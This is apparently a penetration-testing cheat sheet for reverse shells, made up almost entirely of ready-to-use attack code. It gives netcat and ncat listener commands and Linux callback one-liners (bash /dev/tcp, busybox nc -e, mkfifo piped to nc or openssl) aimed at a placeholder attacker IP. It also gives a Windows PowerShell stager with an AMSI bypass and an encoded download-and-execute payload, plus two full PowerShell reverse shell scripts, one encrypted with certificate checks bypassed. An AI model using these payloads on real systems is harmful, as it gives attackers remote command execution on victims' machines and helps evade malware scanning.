There are a handful of killer resources for establishing shells.
Go-to-resource for simple reverse shells: https://revshells.com

### Attacker (Listener)
---
``nc`` is generally used as the listener for a reverse shell, however ``ncat`` is Nmap's fork of ``nc`` which provides optional SSL support for encrypted communications.

Start up a standard reverse shell listener with the following command:

```shell
nc -lvnp <port>
```

Start up a reverse shell listener with SSL support:

```shell
ncat --ssl -lvnp <port>
```

### Linux/Mac
---
For standard, non-SSL reverse shells I recommend referencing https://revshells.com.

On Linux, the sheer quantity of dependencies and programs that may or may not be installed makes it difficult to recommend a commonly used command, but I will provide a couple common ones below.

```shell
# bash -i Callback
sh -i >& /dev/tcp/<attacker_ip>/<port> 0>&1

# Busybox nc -e
busybox nc <attacker_ip> <port> -e sh

# mkfifo / nc Callback
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> <port> >/tmp/f
```

For SSL encrypted reverse shells, the victim should either have ``ncat`` installed or ``openssl``

```shell
# ncat Encrypted Callback
ncat --ssl <attacker_ip> <port>

# mkfifo / openssl Encrypted Callback
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | openssl s_client -connect <attacker_ip>:<port> 2>&1 > /tmp/f & disown
```

### Windows
---
Reference https://github.com/tylerdotrar/PoorMansArmory for a powerful collection of reverse shell building tools.

```powershell
# Generate a Reverse Shell
Get-RevShell <attacker_ip> <listening_port> -AmsiBypass -WebClientURL "http(s)://<ip_addr>" -Base64 > ./downloads/revshell

# Generate a Stager Pointing to the Reverse Shell
Get-Stager -PayloadURL "http(s)://<ip_addr>/d/revshell" -Base64
# Output
powershell -nop -ex bypass -e aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4
ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwACgAcwApADoALwAvADwAaQBwAF8AYQBkAGQAcgA+AC8AZAAvAHIAZQB2AHMAaABlAGwAbAAnACkAKQA=
```

Below is a custom PowerShell 5.0 Reverse Shell Payload:
```powershell
# $IPAddress = "<attacker_ip>"
# $Port = <listening_port>
$Client = [System.Net.Sockets.TcpClient]::new("$IPAddress",$Port)
$Stream = $Client.GetStream()
[byte[]]$Buffer = 0..65535 | % {0}
$LastError = $Error[0]
while (($Data = $Stream.Read($Buffer,0,$Buffer.Length)) -ne 0) {
    $Command   = [System.Text.ASCIIEncoding]::new().GetString($Buffer,0,$Data)
    $Execution = (iex $Command *>&1 | Out-String)
    if ($Error[0] -ne $LastError) { $LastError = $Error[0]; $Execution += "$LastError`n" }
    $OutString = $Execution + "PS " + (PWD).Path + "> "
    $OutBytes  = ([Text.Encoding]::ASCII).GetBytes($OutString)
    $Stream.Write($OutBytes,0,$OutBytes.Length)
    $Stream.Flush()
}
$Client.Close()
```

Below is a custom PowerShell 5.0 Encrypted Reverse Shell Payload:
```powershell
# $IPAddress = "<attacker_ip>"
# $Port = <listening_port>
$SSC = @'
using System;
using System.Net;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static bool Bypass
    (
        Object obj,
        X509Certificate cert,
        X509Chain chain,
        SslPolicyErrors errors
    )
    {
        return true;
    }
    public static SslStream Stream(TcpClient c)
    {
        return new SslStream(c.GetStream(), false, new RemoteCertificateValidationCallback(Bypass), null);
    }
}
'@
Add-Type $SSC
$Client = [System.Net.Sockets.TcpClient]::new("$IPAddress",$Port)
$Stream = [SelfSignedCerts]::Stream($Client)
$Stream.AuthenticateAsClient("")
[byte[]]$Buffer = 0..65535 | % {0}
$LastError = $Error[0]
while (($Data = $Stream.Read($Buffer,0,$Buffer.Length)) -ne 0) {
    $Command   = [System.Text.ASCIIEncoding]::new().GetString($Buffer,0,$Data)
    $Execution = (iex $Command *>&1 | Out-String)
    if ($Error[0] -ne $LastError) { $LastError = $Error[0]; $Execution += "$LastError`n" }
    $OutString = $Execution + "PS " + (PWD).Path + "> "
    $OutBytes  = ([Text.Encoding]::ASCII).GetBytes($OutString)
    $Stream.Write($OutBytes,0,$OutBytes.Length)
    $Stream.Flush()
}
$Client.Close()
```



